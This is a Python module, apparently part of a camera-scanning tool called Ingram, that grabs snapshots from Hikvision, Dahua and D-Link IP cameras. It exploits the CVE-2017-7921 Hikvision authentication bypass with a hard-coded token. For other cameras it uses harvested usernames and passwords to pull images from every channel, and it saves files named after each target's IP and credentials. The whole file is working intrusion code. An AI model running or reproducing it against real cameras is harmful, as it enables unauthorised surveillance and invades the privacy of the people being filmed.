"""Some tools about camera"""
import os
import requests
from xml.etree import ElementTree
from requests.auth import HTTPDigestAuth

from Ingram.utils import get_user_agent


def snapshot(camera_info, path, maxtry=2, timeout=5):
    """select diff func to save snapshot"""
    if not os.path.exists(path):
        os.mkdir(path)

    ip, port, device, user, passwd, vul = camera_info[:6]
    # cve-2017-7921
    if vul == 'cve-2017-7921':
        file_name = os.path.join(path, f"{ip}-{port}-cve_2017_7921.jpg")
        url = f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK"
        snapshot_by_url(url, file_name, maxtry=maxtry, timeout=timeout)
    # if we can get the password
    elif passwd:
        file_name = os.path.join(path, f"{ip}-{port}-{user}-{passwd}.jpg")
        # Hikvision
        if device == 'hikvision':
            # get channels
            channels = 1
            try:
                r = requests.get(f"http://{ip}:{port}/ISAPI/Image/channels", auth=HTTPDigestAuth(user, passwd))
                root = ElementTree.fromstring(r.text)
                channels = len(root)
            except Exception as e:
                pass
            # get all snapshots of all channels
            for ch in range(1, channels + 1):
                url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{ch}01/picture"
                file_name = os.path.join(path, f"{ip}-{port}-channel{ch}-{user}-{passwd}.jpg")
                snapshot_by_url(url, file_name, auth=HTTPDigestAuth(user, passwd), maxtry=maxtry, timeout=timeout)
        # Dahua
        elif device.startswith('dahua'):
            if len(camera_info) > 6:
                channels = camera_info[7]
            else: channels = 1
            for ch in range(1, channels + 1):
                url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi?channel={ch}"
                file_name = os.path.join(path, f"{ip}-{port}-channel{ch}-{user}-{passwd}.jpg")
                snapshot_by_url(url, file_name, auth=HTTPDigestAuth(user, passwd), maxtry=maxtry, timeout=timeout)
        # DLink
        elif device == 'dLink':
            url = f"http://{ip}:{port}/dms?nowprofileid=1"
            snapshot_by_url(url, file_name, auth=(user, passwd), maxtry=maxtry, timeout=timeout)


def snapshot_by_url(url, file_name, auth=None, maxtry=2, timeout=5):
    for _ in range(maxtry):
        try:
            headers = {'User-Agent': get_user_agent(), }
            if auth: r = requests.get(url, auth=auth, timeout=timeout, verify=False, headers=headers)
            else: r = requests.get(url, timeout=timeout, verify=False, headers=headers)
            if r.status_code == 200:
                with open(file_name, 'wb') as f: f.write(r.content)
                break
        except Exception as e:
            pass